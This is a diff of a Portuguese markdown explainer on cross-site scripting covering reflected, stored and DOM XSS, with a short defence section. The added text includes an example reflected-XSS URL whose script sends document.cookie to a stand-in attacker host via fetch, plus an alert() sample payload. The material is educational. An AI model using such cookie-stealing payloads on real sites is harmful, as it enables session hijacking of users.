@@ -1,26 +1,28 @@
-# XSS (Cross-Site Scripting)
+# 💉 XSS (Cross-Site Scripting): Executando Scripts no Alvo
 
-O Cross-Site Scripting (XSS) é uma vulnerabilidade que permite a um atacante injetar scripts maliciosos (geralmente JavaScript) em páginas web visualizadas por outros usuários.
+O XSS ocorre quando um atacante consegue injetar código JavaScript malicioso em uma página legítima, que será executado no navegador da vítima.
 
-## Tipos de XSS
+## 🚀 Como funciona na prática?
+Imagine um campo de "Comentários" que não limpa o que o usuário digita. Se você digitar `<script>alert('Hackeado!')</script>`, qualquer um que ler seu comentário verá o alerta.
 
-### 1. XSS Refletido (Reflected)
-O script malicioso é "refletido" de uma aplicação web para o navegador da vítima. Geralmente é entregue via um link por e-mail ou outra mensagem.
-*Exemplo:* Um parâmetro de busca que exibe o termo pesquisado na tela sem sanitização.
+## 👺 Os 3 Tipos de Ataque
 
-### 2. XSS Armazenado (Stored)
-O script malicioso é armazenado permanentemente no servidor (ex: banco de dados, fórum, campo de comentário). Quando o usuário visita a página afetada, o script é executado.
+### 1. 📬 XSS Refletido (Reflected)
+O ataque é "bate e volta". O script está em um link malicioso.
+- **Exemplo**: `http://site.com/busca?q=<script>fetch('http://atacker.com?c=' + document.cookie)</script>`
+- **Cenário**: O atacante envia esse link para a vítima por e-mail. Ao clicar, o cookie da vítima é enviado para o servidor do atacante.
 
-### 3. XSS Baseado em DOM
-A vulnerabilidade existe no código do lado do cliente (JavaScript) em vez de no lado do servidor. O script manipula o Document Object Model (DOM).
+### 2. 💾 XSS Armazenado (Stored) - O Mais Perigoso!
+O script fica salvo no Banco de Dados do site.
+- **Cenário**: Você posta um comentário malicioso em um fórum. **Todos** os usuários que entrarem naquele post terão seus dados roubados automaticamente.
 
-## Impacto
-- Roubo de cookies de sessão.
-- Sequestro de conta.
-- Redirecionamento para sites maliciosos.
-- Alteração do conteúdo da página (Defacement).
+### 3. 🌳 XSS Baseado em DOM
+Acontece totalmente no navegador, manipulando a estrutura da página (DOM) via JavaScript, sem necessariamente passar pelo servidor.
 
-## Como Prevenir
-- **Escaping de Saída**: Converter caracteres especiais em entidades HTML.
-- **Content Security Policy (CSP)**: Camada de segurança que ajuda a detectar e mitigar ataques XSS.
-- **Uso de Frameworks Modernos**: React, Angular e Vue possuem proteções automáticas contra XSS.
+## 🛡️ Defesa Cibernética
+1. **Sanitização**: Nunca confie no input do usuário. Filtre `<>`, `script`, etc.
+2. **CSP (Content Security Policy)**: Uma regra que diz ao navegador: "Só aceite scripts vindos do MEU servidor".
+3. **HttpOnly Cookies**: Impede que o JavaScript acesse os cookies, anulando o roubo de sessão via XSS.
+
+---
+**Tags:** `JavaScript`, `Injeção`, `Payloads`, `Stored-XSS`, `Reflected-XSS`, `Mitigação`
